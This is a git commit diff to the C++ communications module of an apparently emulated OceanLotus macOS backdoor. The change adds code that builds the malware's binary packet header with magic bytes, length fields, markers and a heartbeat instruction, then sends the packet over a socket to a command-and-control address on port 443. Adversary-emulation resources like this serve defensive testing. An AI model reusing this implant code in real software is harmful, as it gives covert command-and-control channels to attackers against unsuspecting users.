393ee0c92d98ccfc5d0b876264a77df48bb497d1
mchan143 <61020544+mchan143@users.noreply.github.com>
2023-07-17 16:47:02 -0400

    packet header

--- ocean_lotus/Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp
+++ ocean_lotus/Resources/OSX.OceanLotus/Comms/Comms/Comms.cpp
@@ -2,34 +2,61 @@
 
 #define EXPORT __attribute__((visibility("default")))
 
-std::string buildGETRequestString(std::string data) {
+std::string buildGETRequestString(std::string lotusPacket) {
     std::ostringstream buf;
 
     buf << "GET / HTTP/1.1\n";
     buf << "User-Agent: curl 7.64.2\n";
     buf << "Accept: */*\n";
     buf << "Connection: close\n";
-    buf << "Cookie: erp=" << data;
+    buf << "Cookie: erp=" << lotusPacket;
     buf << "\n\n";
 
-    const auto str = buf.str();
-
-    return str;
+    return buf.str();
 }
 
-std::string buildPOSTRequestString(std::string data) {
+std::string buildPOSTRequestString(std::string lotusPacket) {
     std::ostringstream buf;
 
     buf << "POST / HTTP/1.1\n";
     buf << "User-Agent: curl 7.64.2\n";
     buf << "Accept: */*\n";
-    buf << "Content-Length: " << std::to_string(data.length()) << "\n";
+    buf << "Content-Length: " << std::to_string(lotusPacket.length()) << "\n";
     buf << "Content-Type: application/x-www-form-urlencoded\n\n";
-    buf << data;
+    buf << lotusPacket;
 
-    const auto str = buf.str();
+    return buf.str();
+}
 
-    return str;
+void buildLotusHeader(unsigned char * head, int data_length, int key_length) {
+    // magic bytes
+    unsigned char magic_bytes[] = {0x3B, 0x91, 0x01, 0x10};
+    memcpy(head, magic_bytes, sizeof(magic_bytes));
+
+    // payload length (4 bytes)
+    unsigned char payload_length[] = { (unsigned char)data_length };
+    memcpy(&head[4], payload_length, sizeof(payload_length));
+
+    unsigned char key_length_char[] = { (unsigned char)key_length };
+    memcpy(&head[8], key_length_char, sizeof(key_length_char));
+
+    //黑
+    unsigned char marker_1[] = { 0xe9, 0xbb, 0x91 };
+    memcpy(&head[19], marker_1, sizeof(marker_1));
+
+    //客
+    unsigned char marker_2[] = { 0xe5, 0xae, 0xa2 };
+    memcpy(&head[24], marker_2, sizeof(marker_2));
+
+    unsigned char heartbeat_instruction[] = { 0x33 };
+    memcpy(&head[27], heartbeat_instruction, sizeof(heartbeat_instruction));
+
+    //黑
+    memcpy(&head[66], marker_1, sizeof(marker_1));
+
+    //9
+    unsigned char marker_3[] = { 0x39 };
+    memcpy(&head[77], marker_3, sizeof(marker_3));
 }
 
 EXPORT
@@ -38,25 +65,36 @@ void sendRequest(const char * type, const std::vector<unsigned char> data, unsig
     char httpPOST[] = "POST";
     std::string requestBody;
 
+    std::string key = "";
+
+    unsigned char header[82] = { 0 };
+    buildLotusHeader(header, data.size(), key.length());
+
+    std::vector<unsigned char> lotus_packet(header, header + 82);
+    lotus_packet.insert(lotus_packet.end(), data.begin(), data.end());
+
     // convert data to string for building HTTP request
-    std::string data_str(data.begin(), data.end());
+    std::string lotus_packet_str(lotus_packet.begin(), lotus_packet.end());
 
     // build HTTP request string
     if (strcmp(type, httpGET) == 0) {
-        requestBody = buildGETRequestString(data_str);
-        std::cout << "[COMMS] Received data to GET: " + data_str << std::endl;
+        std::cout << "[COMMS] Received data to GET: " + lotus_packet_str << std::endl;
+        requestBody = buildGETRequestString(lotus_packet_str);
     }
     else if (strcmp(type, httpPOST) == 0) {
-        requestBody = buildPOSTRequestString(data_str);
-        std::cout << "[COMMS] Received data to POST: " + data_str << std::endl;
+        std::cout << "[COMMS] Received data to POST: " + lotus_packet_str << std::endl;
+        requestBody = buildPOSTRequestString(lotus_packet_str);
     }
     else {
         return;
     }
 
+    // overwriting the request string until C2 has HTTP request functionality
+    requestBody = lotus_packet_str;
+
     // create socket
-    std::string host = "127.0.0.1";
-    int port = 9000;
+    std::string host = "10.37.129.4";
+    int port = 443;
     
     int sock_connect_status, bytes_read, sock;
     struct sockaddr_in serv_addr;
